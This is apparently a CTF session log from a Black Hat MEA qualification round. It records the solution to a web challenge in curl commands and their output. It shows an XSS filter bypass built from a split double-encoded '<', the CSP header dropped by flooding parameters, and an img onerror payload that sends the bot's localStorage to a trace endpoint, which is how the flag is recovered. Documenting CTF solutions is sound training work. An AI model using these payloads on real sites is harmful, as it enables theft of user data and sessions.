@@ -1,0 +1,43 @@
+Winning session against
+  http://ceff47d53625d4b2552bc6d0b043284c.playat.flagyard.com
+Black Hat MEA CTF Qualification 2026 (FlagYard) -- 2026-09-05.
+(Ephemeral instance, since torn down.)
+
+--------------------------------------------------------------------------------
+[1] Confirm the reflection + the %3c split filter bypass renders one raw '<'
+    and a full attacker-controlled element (public instance, no bot needed):
+--------------------------------------------------------------------------------
+$ curl -s 'http://<host>/?p=view&dir=docs/%253&file=cb%2520onerror%253dalert(1)%253etest' \
+    | grep -o '<div class="card">.*</div>'
+
+<div class="card"><p class="err">404 - no document at <b>docs/<b onerror=alert(1)>test</b></p><p class="muted">Check the name and try again.</p></div>
+
+    (A single param carrying %3c is rejected:)
+$ curl -s 'http://<host>/?p=view&dir=docs/&file=%253ctest' | grep -o 'Encoded path'
+Encoded path
+
+--------------------------------------------------------------------------------
+[2] Full payload reflection (public instance): the CSP header is gone and the
+    injected <img onerror> renders verbatim:
+--------------------------------------------------------------------------------
+$ curl -s -i 'http://<host>/?p=view&dir=docs%2F%253&file=c...&z1=1..z1001=1' | grep -i content-security-policy
+    (no output -- CSP header dropped)
+
+$ curl -s 'http://<host>/?p=view&...' | grep -o '404 - no document at <b>.*</b></p>'
+404 - no document at <b>docs/<img src=x onerror="new Image().src='/?p=trace&id=xk7qp2mn9wab&note='+encodeURIComponent(JSON.stringify(localStorage))"></b></p>
+
+--------------------------------------------------------------------------------
+[3] Deliver to the operator: POST the payload URL to the report console.
+--------------------------------------------------------------------------------
+$ curl -s -X POST 'http://<host>/?p=report' --data-urlencode "url=$(cat artifacts/payload_url.txt)" | grep -o Queued
+Queued
+
+--------------------------------------------------------------------------------
+[4] Read the exfiltrated localStorage back from the same-origin trace store:
+--------------------------------------------------------------------------------
+$ curl -s 'http://<host>/?p=trace&id=xk7qp2mn9wab' | grep -o '<pre>.*</pre>'
+<pre>{&quot;flag&quot;:&quot;BHFlagY{28b936a8477bc9f9a5a5a5c23ae1878d}&quot;}</pre>
+
+    -> decoded: {"flag":"BHFlagY{28b936a8477bc9f9a5a5a5c23ae1878d}"}
+
+*** BHFlagY{28b936a8477bc9f9a5a5a5c23ae1878d} ***
